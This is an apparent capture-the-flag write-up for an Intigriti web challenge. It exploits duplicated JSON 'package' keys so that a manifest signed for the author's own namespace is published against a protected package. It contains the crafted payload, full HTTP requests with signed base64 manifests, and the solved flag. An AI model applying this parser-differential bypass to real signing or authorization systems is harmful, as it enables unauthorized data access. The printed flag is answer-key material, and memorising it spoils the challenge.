### Overview

*Goal* - find the flag `INTIGRITI{...}`
*Flag* - Protected report contains the flag.

### Application - high level

- `Register` and `login` and `logout` endpoints.
- View your `reports history`.
- View specific report - `GUID`.
- Report based on specific `package name & version`.

Reports needs to be signed then published for preflight.

### Interesting info

- My private namespace packages:
	- hello-world (found) - `"Starter package for ordinary read-only compatibility reports."`
	- compat-sample (found) - `"Routine compatibility sample. No protected findings are included."`
	- legacy-adapter (found) - `"Historical ingestion retains the initial package declaration; report rendering uses reconstructed manifest data."`

- Mentioned versions and corresponding packages:
	- security-notes `1.0.0` (not found)
	- compat-bridge `2.4.0` (not found)
	- legacy-parser `0.9.0` (not found)

Idea is to confuse the server to canonicalize manifest to retrieve the flag.

### Target endpoint post data

```json
{
  "package": {
    "scope": "reab-b088927e",
    "name": "legacy-adapter",
    "version": "0.9.0"
  },
  "metadata": {
    "description": "Compatibility check",
    "visibility": "private"
  },
  "operation": "preflight"
}
```
And that JSON manifest is in the b64 string in this.
```json
{"manifest_b64":"ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogInJlYWItYjA4ODkyN2UiLAogICAgIm5hbWUiOiAibGVnYWN5LWFkYXB0ZXIiLAogICAgInZlcnNpb24iOiAiMC45LjAiCiAgfSwKICAibWV0YWRhdGEiOiB7CiAgICAiZGVzY3JpcHRpb24iOiAiQ29tcGF0aWJpbGl0eSBjaGVjayIsCiAgICAidmlzaWJpbGl0eSI6ICJwcml2YXRlIgogIH0sCiAgIm9wZXJhdGlvbiI6ICJwcmVmbGlnaHQiCn0=","approval_id":"828d7745-d1d7-4e06-a4b1-963f6e192896","manifest_sha256":"ac41c40ec4eab27d9f688bf486b82d38fa874ee71cd2c73de8b69b0b08b5651a","nonce":"IqRGGL3GKH-S3klRxM_EQUljmoRrs3FZJO4RSjyAvTk","expires_at":1785411454,"signature":"gIzm8rOmXrFSH1yK7dcLkJZx5glTt+AiUVt2G7RnMPN0p2ZgakouA8r3hpSB4nK5Rc2VNC591CRs7oZ4tXsrCA=="}
```

### Solution

*Flag*: `INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}`
*CVSS*: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
## Overview
I am targeting **security-notes** report, which I don't have access to.
To perform the exploit, two HTTP requests need to be sent using the following payload.

Payload used for exploiting JSON key duplication (scope value should be your namespace, only on first value "reab-..."):
```json
{
  "package": {
    "scope": "reab-b088927e",
    "name": "security-notes",
    "version": "1.0.0"
  },
  "package": {
    "scope": "core",
    "name": "security-notes",
    "version": "1.0.0"
  },
  "metadata": {
    "description": "Compatibility check",
    "visibility": "private"
  },
  "operation": "preflight"
}
```

## HTTP request 1
The payload is base64 encoded and sent as a JSON value of **manifest_b64** key.
```http
POST /api/manifests/sign HTTP/1.1
Host: challenge-0726.intigriti.io
Connection: keep-alive
Content-Length: 443
x-csrf-token: [redacted]
content-type: application/json
Origin: https://challenge-0726.intigriti.io
Cookie: cy_session=[redacted]
X-Intigriti-Username: Reab

{"manifest_b64":"ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogInJlYWItYjA4ODkyN2UiLAogICAgIm5hbWUiOiAic2VjdXJpdHktbm90ZXMiLAogICAgInZlcnNpb24iOiAiMS4wLjAiCiAgfSwKICAicGFja2FnZSI6IHsKICAgICJzY29wZSI6ICJjb3JlIiwKICAgICJuYW1lIjogInNlY3VyaXR5LW5vdGVzIiwKICAgICJ2ZXJzaW9uIjogIjEuMC4wIgogIH0sCiAgIm1ldGFkYXRhIjogewogICAgImRlc2NyaXB0aW9uIjogIkNvbXBhdGliaWxpdHkgY2hlY2siLAogICAgInZpc2liaWxpdHkiOiAicHJpdmF0ZSIKICB9LAogICJvcGVyYXRpb24iOiAicHJlZmxpZ2h0Igp9"}
```
## HTTP request 2
After HTTP request 1 you should get "**201 created**" HTTP response code, if you get other response code, check if your cookie session is expired, or for pasting errors.
The server will respond with JSON data that you will need to include in the next request among the "manifest_b64" from request 1.
```http
POST /api/publications HTTP/1.1
Host: challenge-0726.intigriti.io
Connection: keep-alive
Content-Length: 762
x-csrf-token: [redacted]
content-type: application/json
Origin: https://challenge-0726.intigriti.io
Cookie: cy_session=[redacted]
X-Intigriti-Username: Reab

{"manifest_b64":"ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogInJlYWItYjA4ODkyN2UiLAogICAgIm5hbWUiOiAic2VjdXJpdHktbm90ZXMiLAogICAgInZlcnNpb24iOiAiMS4wLjAiCiAgfSwKICAicGFja2FnZSI6IHsKICAgICJzY29wZSI6ICJjb3JlIiwKICAgICJuYW1lIjogInNlY3VyaXR5LW5vdGVzIiwKICAgICJ2ZXJzaW9uIjogIjEuMC4wIgogIH0sCiAgIm1ldGFkYXRhIjogewogICAgImRlc2NyaXB0aW9uIjogIkNvbXBhdGliaWxpdHkgY2hlY2siLAogICAgInZpc2liaWxpdHkiOiAicHJpdmF0ZSIKICB9LAogICJvcGVyYXRpb24iOiAicHJlZmxpZ2h0Igp9","approval_id":"dd91a2ca-1c84-420a-a6e0-965d5bcc0a80","manifest_sha256":"ad446cb8bc2464a03899f9a6f3a36da8fc38614600da44cd4b01276af5ca1726","nonce":"FupwI5KyzZyLsnhf5orsuVQI8LKo2UOKXeUl85xQxno","expires_at":1785457127,"signature":"k6Apa93kJTcsKh2bIoLxQENK9VawQu/jPJN825PmsqKIRs/LRoeLW3SOOvo3nbxxek7db2VNEN/bcfWUK/9fDA=="}
```

## Verifying the result
If the exploit is successful the last request should also return "**201 created**".
Take a look at the last report in your "**Publication history**".
For example, my report:
```http
GET /api/publications/f3494c78-ee72-4859-862d-9731f222146f HTTP/1.1
Host: challenge-0726.intigriti.io
```
Returns the flag in `"release_notes": "INTIGRITI{[redacted]}"`:
```json
{
    "publication_id": "[redacted]",
    "target": "@core/security-notes",
    "version": "1.0.0",
    "status": "ready",
    "report": {
        "digest": "ad446cb8bc2464a03899f9a6f3a36da8fc38614600da44cd4b01276af5ca1726",
        "target": "@core/security-notes",
        "compatibility": "Read-only preflight completed.",
        "release_notes": "INTIGRITI{[redacted]}",
        "latest_version": "1.0.0",
        "package_exists": true
    },
    "created_at": "2026-07-31T00:14:37.549Z",
    "approval_id": "dd91a2ca-1c84-420a-a6e0-965d5bcc0a80"
}
```